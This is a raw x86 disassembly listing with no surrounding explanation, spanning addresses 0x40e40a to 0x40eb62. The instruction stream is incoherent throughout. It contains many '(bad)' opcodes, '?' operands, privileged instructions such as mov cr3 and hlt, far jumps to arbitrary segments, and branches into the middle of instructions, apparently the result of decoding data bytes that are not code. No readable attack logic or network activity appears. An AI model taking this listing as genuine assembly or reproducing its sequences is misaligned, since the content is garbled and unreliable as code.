  40e40a:	xchg   esi,eax
  40e40b:	mov    ebp,esi
  40e40d:	adc    BYTE PTR [edx+0x52],0x5e
  40e411:	jmp    0xf0b0:0x209ca37e
  40e418:	cmp    ah,BYTE PTR [ebx-0x64f9b208]
  40e41e:	jmp    FWORD PTR [ebx-0x59]
  40e421:	leave  
  40e422:	jecxz  0x40e4a0
  40e424:	jecxz  0x40e468
  40e426:	push   esp
  40e427:	int3   
  40e428:	stos   DWORD PTR es:[edi],eax
  40e429:	mov    ch,BYTE PTR [ecx]
  40e42b:	std    
  40e42c:	out    0x81,al
  40e42e:	xor    ebp,DWORD PTR [edx]
  40e430:	cmc    
  40e431:	hlt    
  40e432:	xchg   esp,eax
  40e433:	es loop 0x40e3c8
  40e436:	cs mov dl,0x1
  40e439:	xlat   BYTE PTR ds:[ebx]
  40e43a:	loop   0x40e4aa
  40e43c:	pusha  
  40e43d:	sub    BYTE PTR [ebx],ah
  40e43f:	test   BYTE PTR [esi-0x8],0xda
  40e443:	jno    0x40e405
  40e445:	cs scas al,BYTE PTR es:[edi]
  40e447:	xor    eax,0xa339ad43
  40e44c:	(bad)
  40e44f:	int    0x10
  40e451:	cli    
  40e452:	pop    ebx
  40e453:	mov    ah,0x57
  40e455:	or     eax,0xfd6db19f
  40e45a:	add    ebp,esi
  40e45c:	mov    ds:0xea464d3a,eax
  40e461:	push   edi
  40e462:	bound  ecx,QWORD PTR [edi+ebx*1]
  40e465:	shl    al,0x19
  40e468:	push   cs
  40e469:	inc    esi
  40e46a:	pop    esp
  40e46b:	stc    
  40e46c:	fnstsw WORD PTR [edx-0x73]
  40e46f:	fld    st(5)
  40e471:	std    
  40e472:	or     DWORD PTR [esi-0xac6b57b],eax
  40e478:	or     edx,DWORD PTR [ebx]
  40e47a:	and    ebp,DWORD PTR [ebx+ebx*2-0x1f6572a3]
  40e481:	push   ss
  40e482:	cmp    al,0x2c
  40e484:	pop    esi
  40e485:	in     al,dx
  40e486:	out    dx,eax
  40e487:	fcomp  QWORD PTR [esi+0xa]
  40e48a:	prefetch BYTE PTR [ebp+edx*4-0x17]
  40e48f:	pop    ss
  40e490:	fadd   DWORD PTR [esi]
  40e492:	xor    eax,0xd24b8f01
  40e497:	mov    bh,0x37
  40e499:	outs   dx,BYTE PTR ds:[esi]
  40e49a:	mov    edx,0xd0cbc915
  40e49f:	ja     0x40e48a
  40e4a1:	add    BYTE PTR [ecx],0x8
  40e4a4:	adc    DWORD PTR [ebx-0x39],eax
  40e4a7:	call   DWORD PTR [edi+0x10b1f6f9]
  40e4ad:	mov    dh,0xb5
  40e4af:	add    eax,0xf7f02fbd
  40e4b4:	jnp    0x40e497
  40e4b6:	jb     0x40e51e
  40e4b8:	cmp    eax,0xcf8fa0
  40e4bd:	inc    esp
  40e4be:	loopne 0x40e515
  40e4c0:	sahf   
  40e4c1:	mov    ds:0xa9cea9f,al
  40e4c6:	mov    cr3,eax
  40e4c9:	pop    ss
  40e4ca:	mov    bh,0xa3
  40e4cc:	popf   
  40e4cd:	iret   
  40e4ce:	or     eax,DWORD PTR [eax]
  40e4d0:	cmp    ecx,DWORD PTR [ebp-0x35e34ff5]
  40e4d6:	xchg   esp,eax
  40e4d7:	and    bh,al
  40e4d9:	cmp    ch,bl
  40e4db:	aas    
  40e4dc:	xchg   ebp,eax
  40e4dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4de:	mov    bl,0xda
  40e4e0:	cmp    dh,BYTE PTR [esi]
  40e4e2:	ins    BYTE PTR es:[edi],dx
  40e4e3:	sbb    DWORD PTR [ecx+0x3c],esp
  40e4e6:	jge    0x40e539
  40e4e8:	dec    ecx
  40e4e9:	leave  
  40e4ea:	ror    BYTE PTR [edx-0x61],cl
  40e4ed:	mov    al,0x4d
  40e4ef:	mov    WORD PTR [edx-0x74],?
  40e4f2:	cdq    
  40e4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4f4:	pop    es
  40e4f5:	ret    0x15da
  40e4f8:	mov    dl,0x93
  40e4fa:	sub    dh,bh
  40e4fc:	icebp  
  40e4fd:	xchg   edi,eax
  40e4fe:	ss scas eax,DWORD PTR es:[edi]
  40e500:	inc    edi
  40e501:	iret   
  40e502:	fcomp  DWORD PTR [eax-0x69]
  40e505:	test   BYTE PTR [ebx+0x25],cl
  40e508:	mov    DWORD PTR [eax+0x21],esp
  40e50b:	pop    ebx
  40e50c:	fldcw  WORD PTR [edi+0x1b31e2d5]
  40e512:	mov    cl,0x64
  40e514:	xor    BYTE PTR [esi+0x59216d2b],0x39
  40e51b:	sar    DWORD PTR [edx+eiz*4],1
  40e51e:	pop    eax
  40e51f:	add    BYTE PTR [ebp+edi*8+0x2fc8b45f],0x9a
  40e527:	push   ds
  40e528:	rcr    DWORD PTR [ebx+0x65cd8523],0x94
  40e52f:	(bad)  
  40e530:	mov    ebp,0xe4ab8a5c
  40e535:	sti    
  40e536:	jmp    0x863e:0xb012f23e
  40e53d:	adc    al,0x47
  40e53f:	add    eax,0x4cc3fe
  40e544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e545:	xor    DWORD PTR [eax+0x2872be94],esi
  40e54b:	(bad)  
  40e54c:	outs   dx,BYTE PTR ds:[esi]
  40e54d:	push   edx
  40e54e:	inc    edx
  40e54f:	push   edi
  40e550:	or     DWORD PTR [edx-0x10ff4901],ebp
  40e556:	xor    ebx,edi
  40e558:	mov    ah,bh
  40e55a:	dec    ebp
  40e55b:	jne    0x40e532
  40e55d:	loopne 0x40e59e
  40e55f:	pop    ebp
  40e560:	xor    DWORD PTR [ebp+eiz*2+0x6c],ebp
  40e564:	or     al,0x28
  40e566:	jecxz  0x40e533
  40e568:	sbb    al,0xd5
  40e56a:	sbb    ecx,edi
  40e56c:	cld    
  40e56d:	push   ss
  40e56e:	pop    eax
  40e56f:	pop    ecx
  40e570:	leave  
  40e571:	inc    ebp
  40e572:	jg     0x40e54c
  40e574:	or     eax,0x1c7763f4
  40e579:	xchg   BYTE PTR [ebx+0x96bfee6],ch
  40e57f:	xchg   ebp,eax
  40e580:	xor    bl,BYTE PTR [esi+0x16248116]
  40e586:	jns    0x40e5f0
  40e588:	adc    bh,BYTE PTR [esi-0x7f]
  40e58b:	dec    eax
  40e58c:	out    dx,al
  40e58d:	ror    DWORD PTR [edx-0x3cb1d2bc],1
  40e593:	dec    eax
  40e594:	int    0xbb
  40e596:	mov    WORD PTR [edx+edi*4],di
  40e59a:	and    bl,BYTE PTR [esi]
  40e59c:	cmp    al,0xeb
  40e59e:	jmp    0x40e5a0
  40e5a0:	lds    eax,FWORD PTR [esi+ebx*1+0x1e]
  40e5a4:	push   0x3
  40e5a6:	out    dx,al
  40e5a7:	add    esi,esi
  40e5a9:	sar    DWORD PTR [ebx+esi*8-0x4e],0xa8
  40e5ae:	dec    eax
  40e5af:	pop    ebp
  40e5b0:	xchg   esp,eax
  40e5b1:	xlat   BYTE PTR ds:[ebx]
  40e5b2:	jl     0x40e55f
  40e5b4:	out    dx,eax
  40e5b5:	inc    ecx
  40e5b6:	in     eax,dx
  40e5b7:	push   ds
  40e5b8:	xchg   edi,eax
  40e5b9:	adc    DWORD PTR [eax-0x6c],0xbb7c737a
  40e5c0:	pop    edi
  40e5c1:	mov    eax,ds:0x25a5f710
  40e5c6:	add    ecx,DWORD PTR [edi-0x34795f42]
  40e5cc:	imul   ebp,DWORD PTR fs:[ecx+edx*4-0x71],0xf75b4db0
  40e5d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5d6:	pop    eax
  40e5d7:	adc    DWORD PTR [edx],edx
  40e5d9:	bound  esi,QWORD PTR [edi]
  40e5db:	xchg   esi,eax
  40e5dc:	sbb    eax,0x9427674a
  40e5e1:	bound  edi,QWORD PTR [ecx+0x4]
  40e5e4:	push   edi
  40e5e5:	adc    DWORD PTR [ebx],esi
  40e5e7:	int3   
  40e5e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5e9:	jp     0x40e5c7
  40e5eb:	(bad)  
  40e5ec:	push   ebx
  40e5ed:	or     eax,0x93061aab
  40e5f2:	xor    edi,DWORD PTR [ebp-0x693a7df3]
  40e5f8:	jge    0x40e65c
  40e5fa:	jl     0x40e634
  40e5fc:	scas   al,BYTE PTR es:[edi]
  40e5fd:	(bad)  
  40e5fe:	ins    DWORD PTR es:[edi],dx
  40e5ff:	dec    edi
  40e600:	test   edx,0xb49c942d
  40e606:	aaa    
  40e607:	mov    esp,0xe95585c3
  40e60c:	test   cl,dl
  40e60e:	fimul  DWORD PTR [edi+edi*1-0x5c]
  40e612:	repnz das 
  40e614:	pop    ebx
  40e615:	mov    ds:0xe0476ff5,eax
  40e61a:	mov    cl,0xc1
  40e61c:	pop    ebx
  40e61d:	add    edx,esi
  40e61f:	shr    BYTE PTR [ecx],1
  40e621:	shl    ah,0x77
  40e624:	push   edx
  40e625:	je     0x40e6a3
  40e627:	push   ebp
  40e628:	cmp    eax,0xd303685
  40e62d:	div    BYTE PTR [ebx-0xc]
  40e630:	adc    eax,0xd5a67e4f
  40e635:	(bad)  
  40e637:	sbb    DWORD PTR [esi],edi
  40e639:	jns    0x40e63d
  40e63b:	ja     0x40e661
  40e63d:	int    0x4f
  40e63f:	sub    DWORD PTR [ebx+0x11],esi
  40e642:	sub    BYTE PTR [eax+0x3016318],dh
  40e648:	scas   eax,DWORD PTR es:[edi]
  40e649:	jle    0x40e5e6
  40e64b:	outs   dx,BYTE PTR ds:[esi]
  40e64c:	pop    ebx
  40e64d:	add    cl,bh
  40e64f:	jnp    0x40e5e0
  40e651:	lods   eax,DWORD PTR ds:[esi]
  40e652:	mov    bh,0x7e
  40e654:	int3   
  40e655:	dec    esi
  40e656:	(bad)  [ecx+0x275dcaf6]
  40e65c:	gs sti 
  40e65e:	lahf   
  40e65f:	xor    al,0x4d
  40e661:	sbb    eax,0xdecdf7d3
  40e666:	ficomp WORD PTR ds:0xd96e6542
  40e66c:	mov    al,ds:0x203b03fa
  40e671:	add    dl,BYTE PTR [edx-0x7c]
  40e674:	test   BYTE PTR [edi+0xa9cc341],al
  40e67a:	jl     0x40e622
  40e67c:	pop    ebx
  40e67d:	lock ja 0x40e672
  40e680:	jno    0x40e69f
  40e682:	add    eax,0x100769ae
  40e687:	fnstcw WORD PTR [edi]
  40e689:	sti    
  40e68a:	ret    
  40e68b:	mov    ds:0x9391e612,al
  40e690:	(bad)  
  40e691:	dec    ebp
  40e692:	xor    eax,0xe72c3039
  40e697:	aas    
  40e698:	ret    0xf01f
  40e69b:	push   edi
  40e69c:	xor    al,0x2d
  40e69e:	fstp   QWORD PTR [edx-0xe6799ed]
  40e6a4:	xor    edi,eax
  40e6a6:	nop
  40e6a7:	test   al,0x74
  40e6a9:	test   BYTE PTR [edx*4+0x1df7cb69],dh
  40e6b0:	mov    ecx,0x3fb46a3d
  40e6b5:	xor    DWORD PTR [eax+0x5bd41ccb],0xffffffab
  40e6bc:	test   DWORD PTR [edx+eiz*2-0x56],0x3aeb8fec
  40e6c4:	retf   0xf765
  40e6c7:	outs   dx,BYTE PTR ds:[esi]
  40e6c8:	shr    DWORD PTR [edi],cl
  40e6ca:	xchg   ebp,eax
  40e6cb:	jo     0x40e71d
  40e6cd:	and    DWORD PTR fs:[esi],edx
  40e6d0:	ror    BYTE PTR ds:[ebp+edi*4+0x2a],1
  40e6d5:	das    
  40e6d6:	or     edx,eax
  40e6d8:	push   edi
  40e6d9:	pop    esi
  40e6da:	pop    ecx
  40e6db:	xchg   edi,eax
  40e6dc:	sbb    BYTE PTR [edi+0x3d515e75],dh
  40e6e2:	popf   
  40e6e3:	cmc    
  40e6e4:	jg     0x40e72d
  40e6e6:	imul   eax,DWORD PTR [edi+0x7e],0xffffffab
  40e6ea:	mov    ebx,0x5618e096
  40e6ef:	pop    eax
  40e6f0:	mov    bl,0x6d
  40e6f2:	mov    dh,al
  40e6f4:	mov    bl,0xab
  40e6f6:	push   ebx
  40e6f7:	pop    esi
  40e6f8:	scas   al,BYTE PTR es:[edi]
  40e6f9:	popf   
  40e6fa:	fsubr  QWORD PTR [ebp-0x66]
  40e6fd:	xor    al,0xb1
  40e6ff:	push   eax
  40e700:	test   BYTE PTR ds:0x6db9eada,0xfd
  40e707:	mov    esi,DWORD PTR gs:[eax-0x3916ea4d]
  40e70e:	jmp    0xc6e9f75b
  40e713:	ds cdq 
  40e715:	mov    ch,0x2e
  40e717:	clc    
  40e718:	mov    esp,0x8b0aa292
  40e71d:	(bad)  
  40e71e:	loopne 0x40e6ca
  40e720:	sub    al,0xf8
  40e722:	ret    0xacff
  40e725:	aam    0xe5
  40e727:	add    esp,edx
  40e729:	adc    BYTE PTR [edi+0x17d45005],0xdd
  40e730:	xchg   esp,eax
  40e731:	out    0x42,al
  40e733:	cs loopne 0x40e707
  40e736:	jne    0x40e75c
  40e738:	and    al,bl
  40e73a:	imul   ecx,esi,0x257923bd
  40e740:	xchg   edi,eax
  40e741:	out    0x28,al
  40e743:	fiadd  DWORD PTR [ebp-0x5ca87998]
  40e749:	dec    edi
  40e74a:	cmp    al,0x8
  40e74c:	dec    ebp
  40e74d:	div    DWORD PTR [edx-0x78086ebf]
  40e753:	jl     0x40e6e8
  40e755:	push   edx
  40e756:	aam    0x63
  40e758:	push   0xffffffda
  40e75a:	pop    ebx
  40e75b:	std    
  40e75c:	push   esi
  40e75d:	push   esi
  40e75e:	ins    DWORD PTR es:[edi],dx
  40e75f:	mov    dh,0xef
  40e761:	dec    ebx
  40e762:	rol    DWORD PTR [eax+0x7141da1d],0x22
  40e769:	cmp    eax,0xe2c75139
  40e76e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e76f:	inc    ebp
  40e770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e771:	dec    esp
  40e772:	push   eax
  40e773:	in     eax,dx
  40e774:	jmp    0x40e72d
  40e776:	or     eax,ebp
  40e778:	and    eax,0xca178f52
  40e77d:	add    BYTE PTR [edi+0x32],dl
  40e780:	cwde   
  40e781:	out    0xd6,eax
  40e783:	mov    bl,0xab
  40e785:	ins    BYTE PTR es:[edi],dx
  40e786:	(bad)  
  40e787:	bound  edi,QWORD PTR [edx-0x6e]
  40e78a:	adc    cl,BYTE PTR [esi]
  40e78c:	loopne 0x40e742
  40e78e:	sti    
  40e78f:	push   edx
  40e790:	mov    ds:0x1ff5d346,al
  40e795:	repnz ss (bad) 
  40e798:	outs   dx,DWORD PTR ds:[esi]
  40e799:	mov    bh,0x54
  40e79b:	les    ebp,FWORD PTR [edi-0x6b36629b]
  40e7a1:	or     bl,BYTE PTR [edi]
  40e7a3:	mov    edx,0x95d7db1c
  40e7a8:	push   eax
  40e7a9:	data16 jb 0x40e764
  40e7ac:	ss cwde 
  40e7ae:	cli    
  40e7af:	dec    ecx
  40e7b0:	adc    DWORD PTR [eax+ebp*1],ecx
  40e7b3:	xchg   ebx,eax
  40e7b4:	ror    bl,cl
  40e7b6:	sub    al,0x4a
  40e7b8:	add    ebx,DWORD PTR [edx-0x2d55018e]
  40e7be:	xchg   esi,eax
  40e7bf:	adc    bl,dl
  40e7c1:	jle    0x40e842
  40e7c3:	imul   ebp,eax,0x3e
  40e7c6:	mov    esi,0x3a766e1b
  40e7cb:	mov    ch,0xf2
  40e7cd:	das    
  40e7ce:	call   0xbd83:0xec4a36e2
  40e7d5:	std    
  40e7d6:	jns    0x40e767
  40e7d8:	mov    eax,ds:0x37fd88cd
  40e7dd:	(bad)  
  40e7de:	xchg   edx,eax
  40e7df:	jno    0x40e85f
  40e7e1:	retf   
  40e7e2:	or     esi,0xfffffff2
  40e7e5:	mov    esi,?
  40e7e7:	push   esi
  40e7e8:	xor    BYTE PTR [edx-0x30],bh
  40e7eb:	mov    bh,0x23
  40e7ed:	push   ebp
  40e7ee:	pop    ds
  40e7ef:	cs pop ecx
  40e7f1:	iret   
  40e7f2:	dec    ebp
  40e7f3:	shl    bl,0x3d
  40e7f6:	or     al,0xec
  40e7f8:	(bad)  
  40e7fa:	icebp  
  40e7fb:	pop    edi
  40e7fc:	ret    
  40e7fd:	mov    ebp,DWORD PTR [edx]
  40e7ff:	mov    al,0x1a
  40e801:	cwde   
  40e802:	xchg   BYTE PTR [esi-0x7aad5bef],cl
  40e808:	ret    
  40e809:	push   edx
  40e80a:	in     eax,0x50
  40e80c:	pop    ebx
  40e80d:	add    al,0x91
  40e80f:	repz mov al,es:0xd7b044e7
  40e816:	hlt    
  40e817:	popa   
  40e818:	pop    edi
  40e819:	jge    0x40e7fa
  40e81b:	(bad)  
  40e81d:	jl     0x40e896
  40e81f:	sti    
  40e820:	clc    
  40e821:	out    0x16,al
  40e823:	in     eax,0x1f
  40e825:	xor    al,0x23
  40e827:	outs   dx,DWORD PTR ds:[esi]
  40e828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e829:	pop    ebp
  40e82a:	not    edx
  40e82c:	sbb    DWORD PTR [ecx+0x3f49d1de],edi
  40e832:	pop    ebx
  40e833:	mov    DWORD PTR [esi],esi
  40e835:	es jno 0x40e8a8
  40e838:	aam    0x1f
  40e83a:	and    DWORD PTR [edi-0x8ee86b],esp
  40e840:	xor    BYTE PTR [esi-0x6d],0x2c
  40e844:	mov    eax,ds:0xf403bbc3
  40e849:	and    dl,ah
  40e84b:	stos   DWORD PTR es:[edi],eax
  40e84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e84d:	fs jmp 0x3b8b:0xc94da60b
  40e855:	js     0x40e88f
  40e857:	mov    ds,WORD PTR [ebx+0x63695119]
  40e85d:	adc    eax,0x91b93659
  40e862:	leave  
  40e863:	sbb    BYTE PTR [ebx-0x78],cl
  40e866:	ja     0x40e881
  40e868:	jns    0x40e88a
  40e86a:	leave  
  40e86b:	mov    al,ds:0x6a211dd
  40e870:	in     al,0xd3
  40e872:	xor    edx,DWORD PTR [ebx+ecx*2-0x35]
  40e876:	or     ah,0xa5
  40e879:	fwait
  40e87a:	mov    edx,0x289b65e1
  40e87f:	mov    DWORD PTR [ebp+0x32],ebp
  40e882:	pop    ecx
  40e883:	sahf   
  40e884:	(bad)  [ecx-0x15f6bea]
  40e88a:	in     eax,dx
  40e88b:	sub    BYTE PTR [ebp-0x23],bl
  40e88e:	adc    edx,DWORD PTR ds:0x72deefb4
  40e894:	mov    cl,bl
  40e896:	mov    esi,DWORD PTR [edx+0x781bb8]
  40e89c:	adc    ebx,edx
  40e89e:	mov    ah,0xce
  40e8a0:	cmp    edx,DWORD PTR [ecx+0x51]
  40e8a3:	scas   al,BYTE PTR es:[edi]
  40e8a4:	(bad)  
  40e8a5:	jmp    0x56fd96a2
  40e8aa:	(bad)  
  40e8ab:	aam    0x1e
  40e8ad:	loop   0x40e89d
  40e8af:	fisubr DWORD PTR [esi-0x3e]
  40e8b2:	fwait
  40e8b3:	sbb    esi,ebp
  40e8b5:	fimul  DWORD PTR [ecx]
  40e8b7:	lods   al,BYTE PTR ds:[esi]
  40e8b8:	paddw  mm4,QWORD PTR [ebp*8+0x15de6a27]
  40e8c0:	mov    eax,0x202f3654
  40e8c5:	cmp    DWORD PTR ds:0x88b908a2,ebx
  40e8cb:	jae    0x40e8d8
  40e8cd:	(bad)  
  40e8cf:	pop    ds
  40e8d0:	mov    ecx,0xa46e2b53
  40e8d5:	dec    eax
  40e8d6:	lods   al,BYTE PTR ds:[esi]
  40e8d7:	jge    0x40e89f
  40e8d9:	imul   ebp,DWORD PTR ds:0x6822dbd6,0x7c
  40e8e0:	xchg   edx,eax
  40e8e1:	js     0x40e8f4
  40e8e3:	jns    0x40e8ac
  40e8e5:	mov    fs,WORD PTR [edx+0x40]
  40e8e8:	ins    DWORD PTR es:[edi],dx
  40e8e9:	and    eax,0x3da56757
  40e8ee:	stc    
  40e8ef:	out    dx,eax
  40e8f0:	ret    
  40e8f1:	mov    edi,0xb6a1e3e1
  40e8f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8f7:	stc    
  40e8f8:	in     eax,0x5b
  40e8fa:	pop    ss
  40e8fb:	jl     0x40e8b7
  40e8fd:	hlt    
  40e8fe:	(bad)  
  40e8ff:	mov    al,0xdf
  40e901:	add    bl,ah
  40e903:	jne    0x40e933
  40e905:	leave  
  40e906:	aaa    
  40e907:	pop    ecx
  40e908:	sbb    BYTE PTR [ebx+0x38],al
  40e90b:	mov    eax,0x55256289
  40e910:	fs xchg esi,eax
  40e912:	push   edx
  40e913:	xor    BYTE PTR [eax+0xb],0xb5
  40e917:	(bad)  
  40e919:	and    al,0xa3
  40e91b:	xor    al,0x1
  40e91d:	(bad)  
  40e91e:	push   ecx
  40e91f:	xor    DWORD PTR ds:0x4e18400b,ecx
  40e925:	inc    ebp
  40e926:	mul    BYTE PTR [ebx-0x3c]
  40e929:	sub    DWORD PTR [ebp*4+0x277a7245],0x93bc572e
  40e934:	(bad)  
  40e935:	clc    
  40e936:	cmp    dl,dh
  40e938:	push   cs
  40e939:	mov    edi,DWORD PTR [esi+esi*2-0x2e]
  40e93d:	mov    dl,0xee
  40e93f:	mov    BYTE PTR gs:[esi],ch
  40e942:	pop    ecx
  40e943:	sbb    eax,0xf790157f
  40e948:	lock pop edx
  40e94a:	adc    al,0x81
  40e94c:	and    DWORD PTR [ebx+0x6a],edx
  40e94f:	pop    es
  40e950:	dec    ecx
  40e951:	fbld   TBYTE PTR [esi+0x5f]
  40e954:	and    DWORD PTR [ecx+0x36e783c9],ebp
  40e95a:	push   ss
  40e95b:	dec    ebp
  40e95c:	sahf   
  40e95d:	jae    0x40e92b
  40e95f:	xchg   ecx,eax
  40e960:	ret    0x4074
  40e963:	inc    ebx
  40e964:	jno    0x40e98c
  40e966:	xchg   DWORD PTR [ecx+esi*2],ecx
  40e969:	sub    al,0x9e
  40e96b:	jno    0x40e946
  40e96d:	repz (bad) 
  40e96f:	daa    
  40e970:	repz test BYTE PTR [ebx-0x9],al
  40e974:	mov    eax,0x9b8c70db
  40e979:	sti    
  40e97a:	neg    ecx
  40e97c:	fisttp QWORD PTR [ebx]
  40e97e:	mov    edi,0x423e6fd3
  40e983:	push   edx
  40e984:	cmp    al,0x7
  40e986:	dec    esp
  40e987:	imul   eax,DWORD PTR [esi-0x5d],0x2a571037
  40e98e:	repz mov ch,0xf9
  40e991:	sub    esi,DWORD PTR [ebp+eax*2+0x6697399e]
  40e998:	iret   
  40e999:	das    
  40e99a:	jl     0x40e93a
  40e99c:	push   ebp
  40e99d:	push   es
  40e99e:	jp     0x40e9e6
  40e9a0:	cmp    bh,BYTE PTR [ebx-0x4d]
  40e9a3:	fiadd  DWORD PTR [ebx+0x4d409025]
  40e9a9:	mov    es,WORD PTR ds:0xc8a4dce4
  40e9af:	out    0x15,al
  40e9b1:	sbb    dh,ch
  40e9b3:	xor    eax,0xa4195706
  40e9b8:	aad    0x79
  40e9ba:	ins    DWORD PTR es:[edi],dx
  40e9bb:	test   al,0x70
  40e9bd:	adc    eax,0xb3669dd3
  40e9c2:	(bad)  
  40e9c3:	xchg   ebp,eax
  40e9c4:	pop    edx
  40e9c5:	push   edx
  40e9c6:	jmp    0xe265622a
  40e9cb:	repz call 0x62f2:0x9e7e00a1
  40e9d3:	das    
  40e9d4:	sub    al,0xc4
  40e9d6:	add    eax,0x90c89c64
  40e9db:	mov    eax,0x27c9afd8
  40e9e0:	pop    eax
  40e9e1:	call   DWORD PTR [ebp+0x7772b04a]
  40e9e7:	data16 (bad) 
  40e9e9:	jmp    0x40ea63
  40e9eb:	sbb    al,0x69
  40e9ed:	add    eax,0x7851caa7
  40e9f2:	jnp    0x40e983
  40e9f4:	inc    edx
  40e9f5:	popa   
  40e9f6:	jo     0x40ea38
  40e9f8:	pushf  
  40e9f9:	sbb    DWORD PTR [ecx-0x9c01604],ebx
  40e9ff:	jge    0x40e9a6
  40ea01:	push   ebp
  40ea02:	jmp    0xd2b1:0x7a31c739
  40ea09:	ins    BYTE PTR es:[edi],dx
  40ea0a:	xchg   edx,eax
  40ea0b:	in     al,dx
  40ea0c:	mov    ah,0x20
  40ea0e:	addr16 dec esp
  40ea10:	sub    ebp,DWORD PTR ds:0xfd69ef88
  40ea16:	mov    ?,WORD PTR [ecx]
  40ea18:	mov    WORD PTR [eax+0x2e],gs
  40ea1b:	fs pop ecx
  40ea1d:	test   DWORD PTR [eax+ebp*8+0x79],edx
  40ea21:	jbe    0x40e9b6
  40ea23:	sub    eax,0xfac9f8ff
  40ea28:	fstp   QWORD PTR ds:0x1878373d
  40ea2e:	stos   DWORD PTR es:[edi],eax
  40ea2f:	mov    DWORD PTR [edx+0x5f],ebp
  40ea32:	das    
  40ea33:	aam    0x2
  40ea35:	stos   BYTE PTR es:[edi],al
  40ea36:	lock xor al,0x43
  40ea39:	xchg   edi,eax
  40ea3a:	sahf   
  40ea3b:	jae    0x40eab3
  40ea3d:	les    esi,FWORD PTR [esi+ecx*4]
  40ea40:	(bad)  
  40ea41:	xor    BYTE PTR [ecx],al
  40ea43:	push   edx
  40ea44:	retf   
  40ea45:	and    eax,0x27e95e4c
  40ea4a:	or     bh,cl
  40ea4c:	ins    DWORD PTR es:[edi],dx
  40ea4d:	add    ecx,DWORD PTR [eax+0xaa6e2b9]
  40ea53:	shl    BYTE PTR [edi+0x6c],0xb5
  40ea57:	pextrw eax,(bad),0xc5
  40ea59:	push   es
  40ea5a:	xchg   ebp,eax
  40ea5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea5c:	adc    BYTE PTR [ebp-0x6494c59a],dl
  40ea62:	mov    edx,0xe2e29c4e
  40ea67:	xchg   ebx,eax
  40ea68:	adc    eax,0x435ee698
  40ea6d:	push   cs
  40ea6e:	enter  0xfed6,0xa2
  40ea72:	mov    bl,0x88
  40ea74:	mov    ecx,0x57af35c2
  40ea79:	pop    eax
  40ea7a:	mov    BYTE PTR es:[ecx-0x5ad5a48c],ch
  40ea81:	pop    esp
  40ea82:	push   esp
  40ea83:	xchg   ebp,eax
  40ea84:	fld    QWORD PTR [edx+0x50]
  40ea87:	mov    BYTE PTR [eax+0x2d],al
  40ea8a:	test   al,0xc6
  40ea8c:	scas   al,BYTE PTR es:[edi]
  40ea8d:	push   ss
  40ea8e:	add    al,0x18
  40ea90:	adc    BYTE PTR [ebp+0x16b6327c],bl
  40ea96:	jecxz  0x40eafe
  40ea98:	push   0x8514c3cf
  40ea9d:	jns    0x40ea82
  40ea9f:	push   eax
  40eaa0:	and    eax,0x6b2119e3
  40eaa5:	leave  
  40eaa6:	sbb    BYTE PTR [edx-0x132f854d],ah
  40eaac:	not    BYTE PTR [ebx+0x288a0f47]
  40eab2:	aaa    
  40eab3:	es sbb al,0xc8
  40eab6:	(bad)  
  40eab7:	pop    ebp
  40eab8:	mov    eax,ds:0xbde3264
  40eabe:	pushf  
  40eabf:	(bad)  
  40eac0:	loope  0x40eb3c
  40eac2:	stos   DWORD PTR es:[edi],eax
  40eac3:	loope  0x40ea49
  40eac5:	jae    0x40ea64
  40eac7:	loopne 0x40ead7
  40eac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaca:	jp     0x40ea7c
  40eacc:	mov    ebp,ebx
  40eace:	mov    esp,0xd16749ba
  40ead3:	pop    esp
  40ead4:	add    BYTE PTR [ebx+0x37f09f60],0xbb
  40eadb:	ret    
  40eadc:	and    DWORD PTR [ebx+0x5d564da1],edi
  40eae2:	rcr    al,1
  40eae4:	xlat   BYTE PTR ds:[ebx]
  40eae5:	ret    
  40eae6:	and    ebx,DWORD PTR [edi+0x36]
  40eae9:	mov    cl,BYTE PTR [ecx+0x48b00c5c]
  40eaef:	lods   eax,DWORD PTR ds:[esi]
  40eaf0:	adc    DWORD PTR [ebx-0x1d],edx
  40eaf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eaf4:	dec    edx
  40eaf5:	xor    ah,dh
  40eaf7:	rcr    BYTE PTR [ecx+0x5a8b18f4],0x82
  40eafe:	jae    0x40eb43
  40eb00:	in     eax,dx
  40eb01:	and    eax,0x6674cfee
  40eb06:	cmc    
  40eb07:	add    BYTE PTR ds:0xb77e1d85,ah
  40eb0d:	xchg   ebp,eax
  40eb0e:	pop    ecx
  40eb0f:	add    ebx,DWORD PTR [ebx]
  40eb11:	test   ebp,esi
  40eb13:	sbb    eax,0x79d94596
  40eb18:	bound  edx,QWORD PTR [ecx+ecx*4-0x44]
  40eb1c:	(bad)  
  40eb1e:	dec    edi
  40eb1f:	sub    ecx,esi
  40eb21:	stos   DWORD PTR es:[edi],eax
  40eb22:	not    ah
  40eb24:	xlat   BYTE PTR ds:[ebx]
  40eb25:	jl     0x40eb9b
  40eb27:	fcomp  QWORD PTR gs:[edi+0x58]
  40eb2b:	adc    edx,DWORD PTR [ecx-0x7446b762]
  40eb31:	or     eax,0x43b7976e
  40eb36:	cdq    
  40eb37:	bound  esi,QWORD PTR [ebx-0x39]
  40eb3a:	scas   eax,DWORD PTR es:[edi]
  40eb3b:	mov    dh,BYTE PTR [edi+0x4e1f4ef]
  40eb41:	inc    edx
  40eb42:	test   al,0x9d
  40eb44:	pop    esi
  40eb45:	xor    al,0x57
  40eb47:	imul   esp,DWORD PTR [eax],0x4f
  40eb4a:	cmc    
  40eb4b:	xchg   edi,eax
  40eb4d:	dec    edi
  40eb4e:	sub    DWORD PTR [esi-0x558e973a],ecx
  40eb54:	(bad)  
  40eb55:	sub    eax,0x476a3fea
  40eb5a:	aam    0x65
  40eb5c:	jb     0x40eb51
  40eb5e:	fsqrt  
  40eb60:	outs   dx,DWORD PTR ds:[esi]
  40eb61:	(bad)  
  40eb62:	sti    
